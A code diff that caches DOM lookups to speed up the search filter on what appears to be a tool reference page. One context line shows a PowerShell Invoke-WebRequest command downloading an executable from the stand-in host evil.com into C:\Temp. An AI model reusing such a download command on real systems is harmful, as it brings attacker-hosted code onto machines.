@@ -315,21 +315,34 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
     const clearBtn = document.getElementById('clearSearch');
     const noResults = document.getElementById('noResults');
 
+    // Performance Optimization: Cache DOM queries and content
+    const toolsData = Array.from(toolCards).map(card => {
+        const titleElement = card.querySelector('.tool-title');
+        const descElement = card.querySelector('.tool-desc');
+        const flagsElement = card.querySelector('.tool-flags');
+
+        return {
+            element: card,
+            title: titleElement ? titleElement.textContent.toLowerCase() : '',
+            keywords: card.getAttribute('data-keywords') ? card.getAttribute('data-keywords').toLowerCase() : '',
+            desc: descElement ? descElement.textContent.toLowerCase() : '',
+            flags: flagsElement ? flagsElement.textContent.toLowerCase() : ''
+        };
+    });
+
     function filterTools(searchTerm) {
         searchTerm = searchTerm.toLowerCase();
         let hasResults = false;
 
-        toolCards.forEach(card => {
-            const title = card.querySelector('.tool-title').textContent.toLowerCase();
-            const keywords = card.getAttribute('data-keywords') ? card.getAttribute('data-keywords').toLowerCase() : '';
-            const desc = card.querySelector('.tool-desc').textContent.toLowerCase();
-            const flags = card.querySelector('.tool-flags') ? card.querySelector('.tool-flags').textContent.toLowerCase() : '';
-
-            if (title.includes(searchTerm) || keywords.includes(searchTerm) || desc.includes(searchTerm) || flags.includes(searchTerm)) {
-                card.classList.remove('hidden');
+        toolsData.forEach(tool => {
+            if (tool.title.includes(searchTerm) ||
+                tool.keywords.includes(searchTerm) ||
+                tool.desc.includes(searchTerm) ||
+                tool.flags.includes(searchTerm)) {
+                tool.element.classList.remove('hidden');
                 hasResults = true;
             } else {
-                card.classList.add('hidden');
+                tool.element.classList.add('hidden');
             }
         });
 
